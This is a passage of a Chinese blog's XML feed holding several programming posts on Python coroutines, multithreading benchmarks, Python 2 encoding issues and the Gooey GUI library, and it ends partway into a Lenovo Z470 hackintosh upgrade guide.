    <content type="text"><![CDATA[真正有知识的人的成长过程，就像麦穗的成长过程：麦穗空的时候，麦子长得很快，麦穗骄傲地高高昂起，但是，麦穗成熟饱满时，它们开始谦虚，垂下麦芒。——蒙田《蒙田随笔全集》 上篇论述了关于python多线程是否是鸡肋的问题，得到了一些网友的认可，当然也有一些不同意见，表示协程比多线程不知强多少，在协程面前多线程算是鸡肋。好吧，对此我也表示赞同，然而上篇我论述的观点不在于多线程与协程的比较，而是在于IO密集型程序中，多线程尚有用武之地。 对于协程，我表示其效率确非多线程能比，但本人对此了解并不深入，因此最近几日参考了一些资料，学习整理了一番，在此分享出来仅供大家参考，如有谬误请指正，多谢。 申明：本文介绍的协程是入门级别，大神请绕道而行，谨防入坑。 文章思路：本文将先介绍协程的概念，然后分别介绍Python2.x与3.x下协程的用法，最终将协程与多线程做比较并介绍异步爬虫模块。 协程概念 协程，又称微线程，纤程，英文名Coroutine。协程的作用，是在执行函数A时，可以随时中断，去执行函数B，然后中断继续执行函数A（可以自由切换）。但这一过程并不是函数调用（没有调用语句），这一整个过程看似像多线程，然而协程只有一个线程执行。 优势 执行效率极高，因为子程序切换（函数）不是线程切换，由程序自身控制，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。 不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。 说明：协程可以处理IO密集型程序的效率问题，但是处理CPU密集型不是它的长处，如要充分发挥CPU利用率可以结合多进程+协程。 以上只是协程的一些概念，可能听起来比较抽象，那么我结合代码讲一讲吧。这里主要介绍协程在Python的应用，Python2对协程的支持比较有限，生成器的yield实现了一部分但不完全，gevent模块倒是有比较好的实现；Python3.4以后引入了asyncio模块，可以很好的使用协程。 Python2.x协程python2.x协程应用： yield gevent python2.x中支持协程的模块不多，gevent算是比较常用的，这里就简单介绍一下gevent的用法。 Gevent gevent是第三方库，通过greenlet实现协程，其基本思想： 当一个greenlet遇到IO操作时，比如访问网络，就自动切换到其他的greenlet，等到IO操作完成，再在适当的时候切换回来继续执行。由于IO操作非常耗时，经常使程序处于等待状态，有了gevent为我们自动切换协程，就保证总有greenlet在运行，而不是等待IO。 Installpip install gevent最新版貌似支持windows了，之前测试好像windows上运行不了…… Usage首先来看一个简单的爬虫例子：12345678910111213#! -*- coding:utf-8 -*-import geventfrom gevent import monkey;monkey.patch_all()import urllib2def get_body(i): print "start",i urllib2.urlopen("http://cn.bing.com") print "end",itasks=[gevent.spawn(get_body,i) for i in range(3)]gevent.joinall(tasks) 运行结果：123456start 0start 1start 2end 2end 0end 1 说明：从结果上来看，执行get_body的顺序应该先是输出”start”，然后执行到urllib2时碰到IO堵塞，则会自动切换运行下一个程序（继续执行get_body输出start），直到urllib2返回结果，再执行end。也就是说，程序没有等待urllib2请求网站返回结果，而是直接先跳过了，等待执行完毕再回来获取返回值。值得一提的是，在此过程中，只有一个线程在执行，因此这与多线程的概念是不一样的。换成多线程的代码看看:12345678910import threadingimport urllib2def get_body(i): print "start",i urllib2.urlopen("http://cn.bing.com") print "end",ifor i in range(3): t=threading.Thread(target=get_body,args=(i,)) t.start() 运行结果：123456start 0start 1start 2end 1end 2end 0 说明：从结果来看，多线程与协程的效果一样，都是达到了IO阻塞时切换的功能。不同的是，多线程切换的是线程（线程间切换），协程切换的是上下文（可以理解为执行的函数）。而切换线程的开销明显是要大于切换上下文的开销，因此当线程越多，协程的效率就越比多线程的高。（猜想多进程的切换开销应该是最大的） Gevent使用说明 monkey可以使一些阻塞的模块变得不阻塞，机制：遇到IO操作则自动切换，手动切换可以用gevent.sleep(0)（将爬虫代码换成这个，效果一样可以达到切换上下文） gevent.spawn 启动协程，参数为函数名称，参数名称 gevent.joinall 停止协程 Python3.x协程python3.5协程使用可以移步：Python3.5协程学习研究 为了测试Python3.x下的协程应用，我在virtualenv下安装了python3.6的环境。python3.x协程应用： asynico + yield from（python3.4） asynico + await（python3.5） gevent Python3.4以后引入了asyncio模块，可以很好的支持协程。 asynico asyncio是Python 3.4版本引入的标准库，直接内置了对异步IO的支持。asyncio的异步操作，需要在coroutine中通过yield from完成。 Usage例子：（需在python3.4以后版本使用）123456789101112import asyncio@asyncio.coroutinedef test(i): print("test_1",i) r=yield from asyncio.sleep(1) print("test_2",i)loop=asyncio.get_event_loop()tasks=[test(i) for i in range(5)]loop.run_until_complete(asyncio.wait(tasks))loop.close() 运行结果：12345678910test_1 3test_1 4test_1 0test_1 1test_1 2test_2 3test_2 0test_2 2test_2 4test_2 1 说明：从运行结果可以看到，跟gevent达到的效果一样，也是在遇到IO操作时进行切换（所以先输出test_1，等test_1输出完再输出test_2）。但此处我有一点不明，test_1的输出为什么不是按照顺序执行的呢？可以对比gevent的输出结果（希望大神能解答一下）。 asyncio说明 @asyncio.coroutine把一个generator标记为coroutine类型，然后，我们就把这个coroutine扔到EventLoop中执行。 test()会首先打印出test_1，然后，yield from语法可以让我们方便地调用另一个generator。由于asyncio.sleep()也是一个coroutine，所以线程不会等待asyncio.sleep()，而是直接中断并执行下一个消息循环。当asyncio.sleep()返回时，线程就可以从yield from拿到返回值（此处是None），然后接着执行下一行语句。 把asyncio.sleep(1)看成是一个耗时1秒的IO操作，在此期间，主线程并未等待，而是去执行EventLoop中其他可以执行的coroutine了，因此可以实现并发执行。 asynico/await 为了简化并更好地标识异步IO，从Python 3.5开始引入了新的语法async和await，可以让coroutine的代码更简洁易读。 请注意，async和await是针对coroutine的新语法，要使用新的语法，只需要做两步简单的替换： 把@asyncio.coroutine替换为async； 把yield from替换为await。 Usage例子（python3.5以后版本使用）：1234567891011import asyncioasync def test(i): print("test_1",i) await asyncio.sleep(1) print("test_2",i)loop=asyncio.get_event_loop()tasks=[test(i) for i in range(5)]loop.run_until_complete(asyncio.wait(tasks))loop.close() 运行结果与之前一致。说明：与前一节相比，这里只是把yield from换成了await，@asyncio.coroutine换成了async，其余不变。 gevent同python2.x用法一样。 协程VS多线程 如果通过以上介绍，你已经明白多线程与协程的不同之处，那么我想测试也就没有必要了。因为当线程越来越多时，多线程主要的开销花费在线程切换上，而协程是在一个线程内切换的，因此开销小很多，这也许就是两者性能的根本差异之处吧。（个人观点） 异步爬虫 也许关心协程的朋友，大部分是用其写爬虫（因为协程能很好的解决IO阻塞问题），然而我发现常用的urllib、requests无法与asyncio结合使用，可能是因为爬虫模块本身是同步的（也可能是我没找到用法）。那么对于异步爬虫的需求，又该怎么使用协程呢？或者说怎么编写异步爬虫？给出几个我所了解的方案： grequests （requests模块的异步化） 爬虫模块+gevent（比较推荐这个） aiohttp （这个貌似资料不多，目前我也不太会用） asyncio内置爬虫功能 （这个也比较难用） 协程池作用：控制协程数量12345678910111213141516171819202122232425262728293031323334353637383940from bs4 import BeautifulSoupimport requestsimport geventfrom gevent import monkey, poolmonkey.patch_all()jobs = []links = []p = pool.Pool(10)urls = [ 'http://www.google.com', # ... another 100 urls]def get_links(url): r = requests.get(url) if r.status_code == 200: soup = BeautifulSoup(r.text) links + soup.find_all('a')for url in urls: jobs.append(p.spawn(get_links, url))gevent.joinall(jobs) 文章学习通道： Python多进程 Python多线程 本文内容参考来源：廖雪峰python教程，推荐新手学习。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>协程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python多线程鸡年不鸡肋]]></title>
    <url>../../../../../../../../2017/02/17/Python多线程鸡年不鸡肋/</url>
    <content type="text"><![CDATA[术业有专攻，如是而已当初在刚学习python多线程时，上网搜索资料几乎都是一片倒的反应python没有真正意义上的多线程，python多线程就是鸡肋。当时不明所以，只是了解到python带有GIL解释器锁的概念，同一时刻只能有一个线程在运行，遇到IO操作才会释放切换。那么，python多线程是否真的很鸡肋呢？要解决这个疑惑，我想必须亲自动手测试。 经过对比python与java的多线程测试，我发现python多线程的效率确实不如java，但远还没有达到鸡肋的程度，那么跟其他机制相比较呢？ 观点：用多进程替代多线程需求 辗转了多篇博文，我看到了一些网友的观点，觉得应该使用python多进程来代替多线程的需求，因为多进程不受GIL的限制。于是我便动手使用多进程去解决一些并发问题，期间也遇到了一些坑，所幸大部分查找资料解决了，然后对多进程做了简单汇总介绍Python多进程。 那么是否多进程能完全替代多线程呢？别急，我们继续往下看。 观点：协程为最佳方案 协程的概念目前来说是比较火热的，协程不同于线程的地方在于协程不是操作系统进行切换，而是由程序员编码进行切换的，也就是说切换是由程序员控制的，这样就没有了线程所谓的安全问题。协程的概念非常广而深，本文暂不做具体介绍，以后会单独成文。 测试数据 好了，网上的观点无非是使用多进程或者协程来代替多线程（当然换编程语言，换解释器之类方法除外），那么我们就来测试下这三者的性能之差。既然要公平测试，就应该考虑IO密集型与CPU密集型的问题，所以分两组数据进行测试。 IO密集型测试 测试IO密集型，我选择最常用的爬虫功能，计算爬虫访问bing所需要的时间。（主要测试多线程与协程，单线程与多进程就不测了，因为没有必要）测试代码：12345678910111213141516171819202122232425262728293031323334353637383940#! -*- coding:utf-8 -*-from gevent import monkey;monkey.patch_all()import geventimport timeimport threadingimport urllib2def urllib2_(url): try: urllib2.urlopen(url,timeout=10).read() except Exception,e: print edef gevent_(urls): jobs=[gevent.spawn(urllib2_,url) for url in urls] gevent.joinall(jobs,timeout=10) for i in jobs: i.join()def thread_(urls): a=[] for url in urls: t=threading.Thread(target=urllib2_,args=(url,)) a.append(t) for i in a: i.start() for i in a: i.join()if __name__=="__main__": urls=["https://www.bing.com/"]*10 t1=time.time() gevent_(urls) t2=time.time() print 'gevent-time:%s' % str(t2-t1) thread_(urls) t4=time.time() print 'thread-time:%s' % str(t4-t2) 测试结果：访问10次gevent-time:0.380326032639thread-time:0.376606941223访问50次gevent-time:1.3358900547thread-time:1.59564089775访问100次gevent-time:2.42984986305thread-time:2.5669670105访问300次gevent-time:6.66330099106thread-time:10.7605059147从结果可以看出，当并发数不断增大时，协程的效率确实比多线程要高，但在并发数不是那么高时，两者差异不大。 CPU密集型CPU密集型，我选择科学计算的一些功能，计算所需时间。（主要测试单线程、多线程、协程、多进程）测试代码：123456789101112131415161718192021222324252627282930313233343536373839#! -*- coding:utf-8 -*-from multiprocessing import Process as profrom multiprocessing.dummy import Process as thrfrom gevent import monkey;monkey.patch_all()import geventdef run(i): lists=range(i) list(set(lists)) if __name__=="__main__": ''' 多进程 ''' for i in range(30): ##10-2.1s 20-3.8s 30-5.9s t=pro(target=run,args=(5000000,)) t.start() ''' 多线程 ''' # for i in range(30): ##10-3.8s 20-7.6s 30-11.4s # t=thr(target=run,args=(5000000,)) # t.start() ''' 协程 ''' # jobs=[gevent.spawn(run,5000000) for i in range(30)] ##10-4.0s 20-7.7s 30-11.5s # gevent.joinall(jobs) # for i in jobs: # i.join() ''' 单线程 ''' # for i in range(30): ##10-3.5s 20-7.6s 30-11.3s # run(5000000) 测试结果： 并发10次：【多进程】2.1s 【多线程】3.8s 【协程】4.0s 【单线程】3.5s 并发20次：【多进程】3.8s 【多线程】7.6s 【协程】7.7s 【单线程】7.6s 并发30次：【多进程】5.9s 【多线程】11.4s 【协程】11.5s 【单线程】11.3s 可以看到，在CPU密集型的测试下，多进程效果明显比其他的好，多线程、协程与单线程效果差不多。这是因为只有多进程完全使用了CPU的计算能力。在代码运行时，我们也能够看到，只有多进程可以将CPU使用率占满。 本文结论 从两组数据我们不难发现，python多线程并没有那么鸡肋。如若不然，Python3为何不去除GIL呢？对于此问题，Python社区也有两派意见，这里不再论述，我们应该尊重Python之父的决定。 至于何时该用多线程，何时用多进程，何时用协程？想必答案已经很明显了。 当我们需要编写并发爬虫等IO密集型的程序时，应该选用多线程或者协程（亲测差距不是特别明显）；当我们需要科学计算，设计CPU密集型程序，应该选用多进程。当然以上结论的前提是，不做分布式，只在一台服务器上测试。 答案已经给出，本文是否就此收尾？既然已经论述Python多线程尚有用武之地，那么就来介绍介绍其用法吧。 Multiprocessing.dummy模块Multiprocessing.dummy用法与多进程Multiprocessing用法类似，只是在import包的时候，加上.dummy。用法参考Multiprocessing用法 threading模块 这是python自带的threading多线程模块，其创建多线程主要有2种方式。一种为继承threading类，另一种使用threading.Thread函数，接下来将会分别介绍这两种用法。 Usage【1】利用threading.Thread()函数创建线程。代码：123456def run(i): print ifor i in range(10): t=threading.Thread(target=run,args=(i,)) t.start() 说明：Thread()函数有2个参数，一个是target，内容为子线程要执行的函数名称；另一个是args，内容为需要传递的参数。创建完子线程，将会返回一个对象，调用对象的start方法，可以启动子线程。 线程对象的方法： Start() 开始线程的执行 Run() 定义线程的功能的函数 Join(timeout=None) 程序挂起，直到线程结束；如果给了timeout，则最多阻塞timeout秒 getName() 返回线程的名字 setName() 设置线程的名字 isAlive() 布尔标志，表示这个线程是否还在运行 isDaemon() 返回线程的daemon标志 setDaemon(daemonic) 把线程的daemon标志设为daemonic（一定要在start（）函数前调用） t.setDaemon(True) 把父线程设置为守护线程，当父进程结束时，子进程也结束。 threading类的方法： threading.enumerate() 正在运行的线程数量 Usage【2】通过继承threading类，创建线程。代码：1234567891011121314151617import threadingclass test(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): try: print "code one" except: passfor i in range(10): cur=test() cur.start()for i in range(10): cur.join() 说明：此方法继承了threading类，并且重构了run函数功能。 获取线程返回值问题 有时候，我们往往需要获取每个子线程的返回值。然而通过调用普通函数，获取return值的方式在多线程中并不适用。因此需要一种新的方式去获取子线程返回值。代码：1234567891011121314151617181920import threadingclass test(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): self.tag=1 def get_result(self): if self.tag==1: return True else: return Falsef=test()f.start()while f.isAlive(): continueprint f.get_result() 说明：多线程获取返回值的首要问题，就是子线程什么时候结束？我们应该什么时候去获取返回值？可以使用isAlive()方法判断子线程是否存活。 控制线程运行数目当需要执行的任务非常多时，我们往往需要控制线程的数量，threading类自带有控制线程数量的方法。代码：12345678910111213141516171819202122import threadingmaxs=10 ##并发的线程数量threadLimiter=threading.BoundedSemaphore(maxs)class test(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): threadLimiter.acquire() #获取 try: print "code one" except: pass finally: threadLimiter.release() #释放for i in range(100): cur=test() cur.start()for i in range(100): cur.join() 说明：以上程序可以控制多线程并发数为10，超过这个数量会引发异常。除了自带的方法，我们还可以设计其他方案：1234567891011121314151617threads=[]'''创建所有线程'''for i in range(10): t=threading.Thread(target=run,args=(i,)) threads.append(t)'''启动列表中的线程'''for t in threads: t.start() while True: #判断正在运行的线程数量,如果小于5则退出while循环, #进入for循环启动新的进程.否则就一直在while循环进入死循环 if(len(threading.enumerate())&lt;5): break 以上两种方式皆可以，本人更喜欢用下面那种方式。 线程池12345678910111213141516import threadpooldef ThreadFun(arg1,arg2): passdef main(): device_list=[object1,object2,object3......,objectn]#需要处理的设备个数 task_pool=threadpool.ThreadPool(8)#8是线程池中线程的个数 request_list=[]#存放任务列表 #首先构造任务列表 for device in device_list: request_list.append(threadpool.makeRequests(ThreadFun,[((device, ), &#123;&#125;)])) #将每个任务放到线程池中，等待线程池中线程各自读取任务，然后进行处理，使用了map函数，不了解的可以去了解一下。 map(task_pool.putRequest,request_list) #等待所有任务处理完成，则返回，如果没有处理完，则一直阻塞 task_pool.poll()if __name__=="__main__": main() 多进程问题，可以赶赴Python多进程现场，其他关于多线程问题，可以下方留言讨论 申明：本文谈不上原创，其中借鉴了网上很多大牛的文章，本人只是在此测试论述Python多线程相关问题，并简单介绍Python多线程的基本用法，为新手朋友解惑。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>多线程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python2编码之殇]]></title>
    <url>../../../../../../../../2017/02/16/解决Python2-x编码之殇/</url>
    <content type="text"><![CDATA[技术的探索，就好像编织故事一般，其乐趣在于偶尔能够讲述给别人听，并获得一些赞同！Python编码问题一直困扰了我许久，之前有过一些总结，但并不系统，比较凌乱。当然python2.x编码问题本身，便是剪不断理还乱。本篇将系统介绍python2.x编程中会遇到的一些编码问题，并给出解决方案。基于对编码问题的摸索了解，我也尝试写了一个编码转换模块Transcode，应该能解决绝大部分新手的疑难杂症。当然，python大神可以绕道而行，至于使用3.x的朋友，以后将会成文介绍。 python编程中会经常遇到操作系统编码、文件编码、控制台输入输出编码、网页编码、源代码编码、python编码，本文将会逐一介绍。首先我们来看看一些常见的编码情况：12345print sys.getdefaultencoding() #系统默认编码print sys.getfilesystemencoding() #文件系统编码print locale.getdefaultlocale() #系统当前编码print sys.stdin.encoding #终端输入编码print sys.stdout.encoding #终端输出编码 将以上这段代码在windows与linux系统下分别运行，查看输出结果。windows终端结果:12345asciimbcs('zh_CN', 'cp936')cp936cp936 Linux终端结果：12345asciiUTF-8('zh_CN', 'UTF-8')UTF-8UTF-8 操作系统编码 操作系统默认编码可以通过sys.getdefaultencoding()函数获取，可以看到windows与linux下默认都为ascii编码，而我们知道ascii编码不支持中文。那么操作系统编码将在python程序的何处会被用到呢？何时又会引发血案？ 触发异常点 经过测试，我发现当需要将unicode格式的字符串存入到文件时，python内部会默认将其先转换为Str格式的系统编码，然后再执行存入步骤。而在这过程中，容易引发ascii异常。实例证明：1234#! -*- coding:utf-8 -*-a=u"中文"f=open("test.txt","w")f.write(a) 报错异常信息：UnicodeEncodeError: ‘ascii’ codec can’t encode characters in position 0-1……说明：因为ascii不支持中文，而变量a为unicode格式的中文字符串，因此无法进行编码而引发异常。 解决方案设置系统编码为utf-8或者gbk。123import sysreload(sys)sys.setdefaultencoding('gbk') 说明：在windows下将其设置为gbk，在linux在设置为utf-8. 终端编码 windows下终端指的是控制台，在控制台上输入输出有着其本身的编码格式，如windows控制台输入输出编码都为cp936。原谅我是第一次看到此编码，于是上网查了会，发现其实它就是常见的GBK编码；而linux终端的输入输出编码都为utf-8。如果我们编写的程序，不会再终端输入输出任何内容，则可以忽略此编码，如若不然终端编码将会非常重要。 乱码点我们在终端执行python脚本时，经常会遇到输出中文乱码，而这往往是因为输出的字符串本身编码与控制台编码不一致。实例证明：1234#! -*- coding:utf-8 -*-a="中文" #定义一个变量，默认为Str，utf-8编码print aprint type(a) windows控制台输出结果：12浣犲ソ&lt;type 'str'&gt; linux终端输出结果：12中文&lt;type 'str'&gt; 造成这种差异的原因在于windows控制台为gbk编码，而变量a本身为utf-8编码。 解决方案1234#! -*- coding:utf-8 -*-a='你好'b=a.decode("utf-8").encode("gbk")print b 将变量a从utf-8编码转换为gbk编码。 python编码 python2.x从外部获取的内容都是string编码，其内部分为String编码与Unicode编码，而String编码又分为UTF-8，GBK，GB2312等等。因此为了避免不同编码造成的报错，python内部最好都转化为unicode编码，在输出时再转化为str编码 。可以用encode()/decode()函数，将string与unicode编码互换。 触发异常点基本在于python内部变量编码与控制台编码，或者其他编码相结合时触发。实例证明：1234#! -*- coding:utf-8 -*-a="中文" #定义一个变量，默认为str，utf-8编码print aprint type(a) 运行结果：12浣犲ソ&lt;type 'str'&gt; 说明：windows下控制台输入输出都是gbk编码格式，而代码中定义的变量a为str，utf-8格式，所以会出现乱码。如果想创建一个unicode编码字符串的变量，则可以a=u”123”，在双引号前面加上一个u，表示a为unicode编码。 解决方案123#! -*- coding:utf-8 -*-a='你好'print a.decode("utf-8").encode("gbk") 说明：首先我们定义的变量a是str格式，编码为utf-8的字符串，我们要将之转化为str格式，GBK编码的字符串。在python内部无法直接转化，需要借助decode()与encode()函数。decode()函数先将str格式的字符串a转化为unicode，再将unicode编码为str格式GBK。而在Unix系统下，不存在这个问题，因为都是utf-8编码，不会存在乱码。print语句默认会将unicode编码的字符串，encode为相应系统的str编码并输出（windows下为gbk,unix下为utf-8）,因此不用担心print unicode编码字符串会报错。 源代码编码源代码编码指的是python程序本身的编码，默认为ascii。 触发异常点 python程序本身要被解释器解析执行，需要先被转化为二进制代码。而在这过程中容易引发异常，原因同样是ascii不支持中文，因此当python程序中出现中文时，哪怕是注释，也会引发ascii异常。实例证明：1print "中文" #中文注释 报错：SyntaxError: Non-ASCII character ‘\xe7’…… 解决方案1#! -*- coding:utf-8 -*- python程序开头加上这句代码，指定python源代码编码格式为utf-8。 文件编码 文件编码指的是，python程序从文件中获取的内容的编码格式。可以用sys.getfilesystemencoding()函数获取，windows下为mbcs，linux下为utf-8。至于mbcs，是一种多字节编码（没搞很明白）。 触发异常点（读取文件内容）当python程序从文件中获取内容，并输出时，容易触发异常。实例证明：12345#! -*- coding:utf-8 -*-f=open("test.txt","r")content=f.read()print type(content)print content 运行结果：12&lt;type 'str'&gt;你好 可以看到windows下，从文件中读取的编码格式为Str，GBK格式（因为控制台输出没有中文乱码）；而在Unix下为Str，Utf-8格式。从输出内容来说，并没有触发异常，然而当这些内容与python程序自身内容相结合时，容易触发异常。 解决方案在windows下，最好将文件内容转为unicode，可以使用codecs：1f=codecs.open("test.txt", encoding='gbk').read() 将格式为gbk的文件内容转化为unicode格式，当然也可以直接使用open(“”,”r”).read().decode(“gbk”) 触发异常点（写入文件内容）参考操作系统编码触发异常点，即将中文unicode字符写入文件时，容易触发异常。 解决方案参考操作系统编码解决方案，或者手动将unicode编码转换为str编码。实例证明：1234#! -*- coding:utf-8 -*-a=u"中文" #a为unicode格式编码f=open("test.txt","w")f.write(a.encode("gbk")) 当然如果变量a本身就是Str则不会报错，只是utf-8编码的内容写入windows文件中，显示会乱码。 网页编码 网页编码，通常在写爬虫的时候经常遇到，再结合系统编码，python编码，文件编码，往往会搞得一团乱。在程序中我们应该分别处理这些编码，在python内部全部转化为unicode。那么网页编码又有哪些格式呢？常见格式：utf-8，gbk，gb2312 触发异常点还是在于从网页中获取的源码编码与终端编码，甚至python内部编码不一致的情况。实例证明：12345#!coding=utf-8import urllib2body=urllib2.urlopen('http://thief.one').read()print type(body)print body 运行结果：12&lt;type 'str'&gt;body中文显示乱码 说明：这个网站的编码是utf-8，而且python从网页上爬取的内容都为Str格式，在windows控制台下输出会乱码。 解决方案 依照之前做法，先将其转化为unicode。而相应的正则也可以为unicode编码，如：res=r’’+u”新成员”。可以通过chardet模块判断网页编码类型，返回的是一个带概率的字典。 编码判断判断字符串编码1isinstance(obj, (str, unicode)) 返回True或者False 判断网页编码1234import chardetimport urllib2body=urllib2.urlopen("http://thief.one").read()chardet.detect(body) 判断编码格式，会有百分比，一般用来判断网页编码比较好。 判断系统编码12345print sys.getdefaultencoding() #系统默认编码print sys.getfilesystemencoding() #文件系统编码print locale.getdefaultlocale() #系统当前编码print sys.stdin.encoding #终端输入编码print sys.stdout.encoding #终端输出编码 python2.x编码建议 请尽量在Linux系统上编程，综上我们可以知道linux下较windows，编码问题良好很多。 python代码内部请全部使用unicode编码，在获取外部内容时，先decode为unicode，向外输出时再encode为Str 在定义变量或者正则时，也定义unicode字符，如a=u”中文”；res=r””+u”正则”。 其他疑难杂症实例一：12a="\\u8fdd\\u6cd5\\u8fdd\\u89c4"print a 变量a的内容本身为unicode编码，怎么正常显示输入？解决方案：123a="\\u8fdd\\u6cd5\\u8fdd\\u89c4" # unicode转化为中文b=a.decode('unicode-escape')print b 如果阅读完本章，增加了您对python编码问题的认识，那我会感到欣慰，如有python编码上的问题可以在下方留言。 如果阅读完本章，您仍然不知如何解决python乱码问题，没关系，请继续移步阅读Transcode解决python编码问题 为了能够让您重视，我不得不再次重申：解决python2.x编码问题的关键，在于要明白无论从哪里来的内容，在python内部流通时，都应该先转换为unicode。（python3.x在这方面做了改进，并取得了很好的效果） 传送门Python2编码之殇续集Python3编码之美]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python编码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gooey魔法]]></title>
    <url>../../../../../../../../2017/02/15/Gooey魔法/</url>
    <content type="text"><![CDATA[Gooey是python的一个扩展模块，能够使用一条命令，将命令行程序变成一个 GUI 程序。它能够解析argparse模块的命令行参数，将之变成wxpython的GUI控件。当然，Gooey本身也带有命令行解析的函数—GooeyParser。下面就简单介绍Gooey的用法，以及优缺点。 安装Gooey最简单的安装方法：1pip install Gooey 或者：1git clone https://github.com/chriskiehl/Gooey.git 然后运行setup.py :1python setup.py install 相关依赖：wxpython安装：pip install wxpython (windows下需要去官网下载安装包) 使用Gooey转化argparse最简单的例子，将argparse参数转化为GUI控件：1234567891011121314#! -*- coding:utf-8 -*-from gooey import Gooeyimport argparse@Gooey()def main(): parser = argparse.ArgumentParser() parser.add_argument("test",help="this is a test" ) args=parser.parse_args() print argsif __name__=="__main__": main() 运行截图： 说明：可以看到Gooey作为装饰器使用，Gooey()可以设置参数。 参数：1234567891011121314@Gooey(advanced=Boolean, # toggle whether to show advanced config or not language=language_string, # Translations configurable via json show_config=True, # skip config screens all together program_name='name', # Defaults to script name program_description, # Defaults to ArgParse Description default_size=(610, 530), # starting size of the GUI required_cols=1, # number of columns in the "Required" section optional_cols=2, # number of columbs in the "Optional" section dump_build_config=False, # Dump the JSON Gooey uses to configure itself load_build_config=None, # Loads a JSON Gooey-generated configuration monospace_display=False) # Uses a mono-spaced font in the output screen image_dir # Path to the diretory in which Gooey should look for custom inmages language_dir # Path to the diretory in which Gooey should look for custom languages) 参数中最常用的有program_name（标题，默认为文件名），default_size(界面大小)，image_dir(ico图标地址，可以相对地址，windows下注意用反斜杠)123456789@Gooey(program_name=u'这是一个测试脚本',default_size=(500,500))def main(): parser = argparse.ArgumentParser(description=u"测试描述内容") parser.add_argument("test",help="this is a test" ) args=parser.parse_args() print argsif __name__=="__main__": main() 运行截图： 使用GooeyParse简单例子：1234567891011121314151617181920212223242526272829from gooey import Gooey, GooeyParser@Gooey(program_name="test",image_dir=".\image") ##注意斜杠def main(): parser=GooeyParser(description=u"测试") ##文本输入框 parser.add_argument("test",help="this is a test") ##选择框 parser.add_argument( "test2", metavar='Should I exlode?', ##描述内容 help="this is test2", ##帮助内容 choices=["Yes","No"], ##选择框 default="Yes" ##默认值 ) ##复选框 parser.add_argument( '-f','--foo', metavar="some flag", action="store_true", ##参数类型 help="") ##文本选择按钮 parser.add_argument('filename', metavar=u"文件选择",help="name of the file to process", widget='FileChooser') #文本选择按钮 parser.add_argument('datetime', metavar=u"时间选择",help="date to process",widget='DateChooser',default="2017-02-15") #时间选择按钮 args=parser.parse_args() print argsif __name__=="__main__": main() 运行截图：说明：image_dir设置为当前目录下image目录，则程序会去image目录下寻找相应的图片来覆盖默认的图片，因此覆盖的图片名字必须为默认的图片名;可以看到运行界面上分为Required Arguments与Optional Arguments参数，代码中’test’对应前者，’-test’对应后者；metavar表示描述信息；action表示控件类型；help为帮助信息；widget为小工具；default为默认内容。 image目录下图片文件名，分别用来覆盖界面上的图片： program_icon.ico ico图标 success_icon.png 运行成功的图标 running_icon.png 正在运行时的图标 loading_icon.gif 加载时的图标 config_icon.png 配置图片 error_icon.png 出错时的图片 action内容表示参数类型，分别对应着wxpython相应的控件： store TextCtrl store_const CheckBox store_true CheckBox store_False CheckBox append TextCtrl count DropDown Mutually Exclusive Group RadioGroup chooice DropDown 除了action之外，Gooey还提供了一些小工具（Widgets） DirChooser 目录选择按钮工具 FileChooser 文件选择按钮工具 DateChooser 时间选择按钮工具 优缺点 说说个人使用的一点总结，优点是方便，无需太多的代码，也免去了界面设计。缺点是不太适合操作非常复杂的程序，且目前支持的控件不多。额外一点，在打包程序时，会有很多Bug，有待解决。 参考文档：GitHub地址:https://github.com/chriskiehl/Gooey官方例子：https://github.com/chriskiehl/GooeyExamples/tree/master/examples官方文档：https://github.com/chriskiehl/Gooey#how-does-it-work]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>Gooey</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[联想Z470黑化之路]]></title>
    <url>../../../../../../../../2017/02/13/联想Z470黑苹果教程/</url>
    <content type="text"><![CDATA[11年入手了一台联想Z470，到现在也有些年头了，当年是看中了它的外观，现在想来性能是它的短板。然而为了工作需要，我便又购置了一台高性能电脑。现如今便想着怎么处理这台小Z，有人建议当废品出售，但无论如何它都跟了我这么多年，舍弃有些不忍。抱着勤俭持家的态度，我便狠了狠心决定多花点钱，将它全面更新升级。在上网找了些资料后，便开始整理思路，汇总如下： 更新内容：将原有部分硬件换新（声卡、网卡、外壳、键盘等） 升级内容：内存加到8G，添加固态硬盘 系统更换：黑化之苹果系统 这其中最繁琐的要数装黑苹果系统，技术含量比较高，前2个比较好实现（只要花钱）。有了目标，便开始淘宝购买物件吧，前后大概花了800多，终于凑齐了所有所需之物，好了，那么便开始吧！ 更换升级零件 对于物件更换，这里不多介绍，只要会拆机就行，拆机之前多上网查查机型，根据教程来，不要盲目拆机。 加内存条也比较简单，也是先查询机型兼容的内存条型号，购买相应的装入即可。 至于安装SSD（固态硬盘），我的做法是将光驱拆下，将原有的机械硬盘放到光驱（需要购买托盘），再将SSD装入原先机械硬盘处即可。 以上一切做完之后，小Z已经从硬件上进行了全面大升级（显卡跟CPU不建议更改，可能会使主板损坏，其提升效果不明显）。接下来就是本文重点，更换苹果系统。 安装黑苹果准备阶段 第一：上网查资料，上网查资料，上网查资料。。。。。重要的事情多说几遍，要学会自己查找答案。 第二：查找对应机型的电脑是否有安装黑苹果成功的案例，如果没有，那么我觉得是时候放弃了（除非是专门研究黑苹果的技术男，不然不要轻易去试）。我算运气比较好的，上网查了一圈，发现有不少小Z安装黑苹果成功的案例。 第三：根据网上成功的教程，下载好所需的软件，复制网上成功的路线。 所需软件： 变色龙引导程序 懒人版镜像 硬盘助手 HFS DiskGenius Pro 4.30 …… 准备工作都弄好了，那么可以开始动手干了！ 安装变色龙引导程序以管理员身份打开： 